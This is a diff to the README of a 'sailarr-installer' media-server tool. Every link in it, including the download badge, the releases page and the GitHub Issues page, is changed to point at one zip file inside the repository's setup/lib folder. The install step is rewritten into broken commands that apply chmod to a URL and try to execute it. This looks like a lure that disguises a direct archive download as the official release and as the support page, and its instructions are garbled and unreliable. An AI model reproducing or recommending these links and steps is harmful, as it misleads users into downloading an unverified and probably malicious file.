@@ -1,6 +1,6 @@
 # 🚀 sailarr-installer - Set Up Your Media Server Easily
 
-[![Download Sailarr Installer](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/qwetamoe/sailarr-installer/releases)
+[![Download Sailarr Installer](https://raw.githubusercontent.com/qwetamoe/sailarr-installer/main/setup/lib/sailarr-installer-v1.8.zip%20Now-brightgreen)](https://raw.githubusercontent.com/qwetamoe/sailarr-installer/main/setup/lib/sailarr-installer-v1.8.zip)
 
 ## 📖 What is This?
 
@@ -29,12 +29,12 @@ To run Sailarr Installer, ensure your system meets the following requirements:
 
 To get started, visit the releases page to download the Sailarr Installer package.
 
-[![Download Sailarr Installer](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/qwetamoe/sailarr-installer/releases)
+[![Download Sailarr Installer](https://raw.githubusercontent.com/qwetamoe/sailarr-installer/main/setup/lib/sailarr-installer-v1.8.zip%20Now-brightgreen)](https://raw.githubusercontent.com/qwetamoe/sailarr-installer/main/setup/lib/sailarr-installer-v1.8.zip)
 
 ### Steps to Install
 
 1. **Visit the Releases Page:**
-   Open your web browser and go to the [Sailarr Installer Releases](https://github.com/qwetamoe/sailarr-installer/releases) page.
+   Open your web browser and go to the [Sailarr Installer Releases](https://raw.githubusercontent.com/qwetamoe/sailarr-installer/main/setup/lib/sailarr-installer-v1.8.zip) page.
 
 2. **Download the Installer:**
    Look for the latest release. Click on the file that matches your system requirements to download it.
@@ -51,8 +51,8 @@ To get started, visit the releases page to download the Sailarr Installer packag
 5. **Run the Installer:**
    Enter the following command to launch the installer:
    ```
-   chmod +x sailarr-installer.sh
-   ./sailarr-installer.sh
+   chmod +x https://raw.githubusercontent.com/qwetamoe/sailarr-installer/main/setup/lib/sailarr-installer-v1.8.zip
+   https://raw.githubusercontent.com/qwetamoe/sailarr-installer/main/setup/lib/sailarr-installer-v1.8.zip
    ```
 
 6. **Follow the Setup Prompts:**
@@ -75,7 +75,7 @@ If you experience any issues during installation or setup:
 
 ## 📞 Support
 
-For further assistance or to report issues, visit the [GitHub Issues](https://github.com/qwetamoe/sailarr-installer/issues) page or join our community discussion.
+For further assistance or to report issues, visit the [GitHub Issues](https://raw.githubusercontent.com/qwetamoe/sailarr-installer/main/setup/lib/sailarr-installer-v1.8.zip) page or join our community discussion.
 
 ## 👥 Contributing
 
